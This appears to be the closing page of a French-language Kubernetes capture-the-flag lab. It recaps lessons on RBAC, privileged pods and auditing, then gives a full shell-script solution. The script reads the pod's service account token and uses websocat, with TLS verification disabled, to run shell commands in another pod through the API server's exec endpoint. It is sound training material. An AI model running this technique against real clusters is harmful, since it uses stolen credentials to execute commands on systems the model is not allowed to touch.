# Félicitations !

Vous avez réussi à naviguer dans le cluster, à identifier les failles de sécurité et à extraire le flag secret !

Ce challenge a mis en évidence l'importance :

*   De la configuration RBAC (ne pas donner trop de droits, surtout au Service Account par défaut).
*   De la sécurité des pods (éviter les pods `privileged` autant que possible).
*   De l'audit régulier des configurations de sécurité dans votre cluster.

Vous avez démontré de solides compétences en exploration et en compréhension des mécanismes internes de Kubernetes. Bravo !


Solution avec websocat 


```sh
#!/bin/sh

# Script POSIX sh pour exécuter une commande dans un pod Kubernetes via WebSocket,
# en utilisant jq pour l'encodage URL.

# --- Configuration ---
# Récupérer le token du service account
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# Chemin vers le certificat CA (même si --insecure est utilisé)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
# Adresse de l'API Server Kubernetes
APISERVER=https://172.30.1.2:6443
# Namespace cible
NAMESPACE=awcc
# Nom du Pod cible
POD_NAME="legacy-internal-db"

# --- Commande à exécuter ---
# L'exécutable
COMMAND_EXEC="/bin/sh"
# Premier argument de l'exécutable (-c pour sh)
COMMAND_ARG1="-c"
# Deuxième argument : la commande réelle à exécuter par le shell
COMMAND_ARG2="ls -l /data"

# --- Encodage URL avec jq ---
# Vérifier si jq est disponible
if ! command -v jq > /dev/null; then
    echo "Erreur: La commande 'jq' est requise par ce script mais n'a pas été trouvée dans le PATH." >&2
    exit 1
fi

# Fonction pour encoder une chaîne en utilisant jq (fonctionne en sh)
urlencode_jq() {
    printf %s "$1" | jq -sRr @uri
}

# Encoder chaque partie de la commande
ENCODED_EXEC=$(urlencode_jq "$COMMAND_EXEC")
ENCODED_ARG1=$(urlencode_jq "$COMMAND_ARG1")
ENCODED_ARG2=$(urlencode_jq "$COMMAND_ARG2")

# --- Construction de l'URL WSS ---
# Extraire l'hôte de l'APISERVER de manière portable (compatible sh)
APIHOST=$(printf %s "$APISERVER" | sed 's|https://||')

# Construire l'URL en ajoutant les paramètres 'command' séparément
WSS_URL="wss://${APIHOST}/api/v1/namespaces/${NAMESPACE}/pods/${POD_NAME}/exec"
WSS_URL="${WSS_URL}?command=${ENCODED_EXEC}"  
WSS_URL="${WSS_URL}&command=${ENCODED_ARG1}"  
WSS_URL="${WSS_URL}&command=${ENCODED_ARG2}"
WSS_URL="${WSS_URL}&stdin=false"
WSS_URL="${WSS_URL}&stdout=true"
WSS_URL="${WSS_URL}&stderr=true"
WSS_URL="${WSS_URL}&tty=false"

# Afficher l'URL construite (pour le débogage)
echo "URL Construite : ${WSS_URL}"

# --- Exécution avec websocat ---
echo "Tentative avec websocat..."
websocat -v \
  --header "Authorization: Bearer ${TOKEN}" \
  --header "X-Stream-Protocol-Version: v4.channel.k8s.io" \
  --header "Sec-WebSocket-Protocol: v4.channel.k8s.io" \
  --insecure \
  "${WSS_URL}"

# Vérifier le code de sortie de websocat (optionnel)
exit_code=$?
if [ "$exit_code" -ne 0 ]; then
  echo "websocat a échoué avec le code de sortie: $exit_code" >&2
fi

exit "$exit_code"

```
